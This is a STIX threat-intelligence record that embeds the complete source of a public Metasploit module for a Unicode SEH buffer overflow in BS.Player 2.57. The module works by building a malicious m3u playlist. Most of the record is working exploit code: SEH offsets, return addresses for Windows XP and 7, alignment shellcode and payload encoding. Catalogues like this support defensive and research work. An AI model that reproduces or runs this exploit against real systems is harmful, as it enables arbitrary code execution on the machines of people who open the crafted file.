{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4add6c45-2f59-4287-8a55-a3c00a236e01",
    "created": "2024-08-14T16:35:58.952334Z",
    "modified": "2024-08-14T16:35:58.952338Z",
    "name": "BS.Player 2.57 Buffer Overflow (Unicode SEH)",
    "description": " This module exploits a buffer overflow in BS.Player 2.57. When the playlist import is used to import a specially crafted m3u file a buffer overflow occurs allowing arbitrary code execution.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/bsplayer_m3u.rb",
            "external_id": "bsplayer_m3u.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'BS.Player 2.57 Buffer Overflow (Unicode SEH)',\n      'Description'    => %q{\n          This module exploits a buffer overflow in BS.Player 2.57. When\n        the playlist import is used to import a specially crafted m3u file,\n        a buffer overflow occurs allowing arbitrary code execution.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'C4SS!0 G0M3S ', # Original Exploit\n          'Chris Gabriel', # MSF Module\n          #Greets: Corelan team for mona.py & awesome tutorials\n        ],\n      'References'     =>\n        [\n          [ 'OSVDB', '82528' ],\n          [ 'EDB', '15934' ]\n        ],\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC' => 'process',\n          #'InitialAutoRunScript' => 'migrate -f',\n        },\n      'Platform'       => 'win',\n      'Payload'        =>\n        {\n          'Space'           => 2000,\n          'BadChars'        => \"\\x00\\x0a\\x0d\\x1a\\x80\",\n          'DisableNops'     => true,\n          'StackAdjustment' => -3500,\n        },\n\n      'Targets'        =>\n        [\n          [ 'Windows XP',\n            {\n              # pop ecx # pop ebp # ret 0c\n              # ASLR: False, Rebase: False, SafeSEH: False\n              # v2.5.7.1051 (bsplayer.exe)\n              'Ret'     => \"\\x2f\\x49\",\n              'Offset'  => 4102,\n              'Padding' => 1879\n            }\n          ],\n          [ 'Windows 7',\n            {\n              # pop ecx # pop ebp # ret 0c\n              # ASLR: False, Rebase: False, SafeSEH: False\n              # v2.5.7.1051 (bsplayer.exe)\n              'Ret'     => \"\\x2f\\x49\",\n              'Offset'  => 4102,\n              'Padding' => 1931\n            }\n          ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2010-01-07',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ false, 'The file name.', 'msf.m3u']),\n      ])\n\n  end\n\n  def exploit\n\n    nseh = \"\\x61\\x42\"\n\n    align  = ''\n    align << \"\\x58\"\t# POP EAX\n    align << \"\\x6d\"\t# PAD\n    align << \"\\x58\"\t# POP EAX\n    align << \"\\x6d\"\t# PAD\n    align << \"\\x58\"\t# POP EAX\n    align << \"\\x6d\"\t# PAD\n    align << \"\\x58\"\t# POP EAX\n    align << \"\\x6d\"\t# PAD\n    align << \"\\x58\"\t# POP EAX\n    align << \"\\x6d\"\t# PAD\n    align << \"\\x58\"\t# POP EAX\n    align << \"\\x6d\"\t# PAD\n    align << \"\\x58\"\t# POP EAX\n    align << \"\\x6d\"\t# PAD\n    align << \"\\x58\"\t# POP EAX\n    align << \"\\x6d\"\t# PAD\n    align << \"\\x58\"\t# POP EAX\n    align << \"\\x6d\"\t# PAD\n    align << \"\\x58\"\t# POP EAX\n    align << \"\\x6d\"\t# PAD\n    align << \"\\x58\"\t# POP EAX\n    align << \"\\x6d\"\t# PAD\n    align << \"\\x58\"\t# POP EAX\n    align << \"\\x6d\"\t# PAD\n    align << \"\\x58\"\t# POP EAX\n    align << \"\\x6d\"\t# PAD\n    align << \"\\x50\"\t# PUSH EAX\n    align << \"\\x6d\"\t# PAD\n    align << \"\\xc3\"\t# RET\n\n    enc = framework.encoders.create('x86/unicode_mixed')\n    register_to_align_to = \"EAX\"\n    enc.datastore.import_options_from_hash({ 'BufferRegister' => register_to_align_to })\n    unicodepayload = enc.encode(payload.encoded, nil, nil, platform)\n\n    padding = rand_text_alpha_lower(target['Padding'])\n\n    buffer  = \"http://\"\n    buffer << rand_text_alpha_lower(target['Offset'])\n    buffer << nseh\n    buffer << target['Ret']\n    buffer << align\n    buffer << padding\n    buffer << unicodepayload\n\n    file_create(buffer)\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-01-07",
    "x_mitre_platforms": [
        "win'"
    ]
}